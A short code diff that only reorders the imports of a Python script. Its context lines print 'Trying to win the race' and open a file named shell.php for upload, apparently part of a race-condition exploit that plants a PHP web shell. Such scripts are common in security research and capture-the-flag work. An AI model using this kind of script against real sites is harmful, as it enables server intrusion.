@@ -1,7 +1,8 @@
 import itertools
-import requests
-import sys
 import string
+import sys
+
+import requests
 
 print('[+] Trying to win the race')
 f = {'file': open('shell.php', 'rb')}
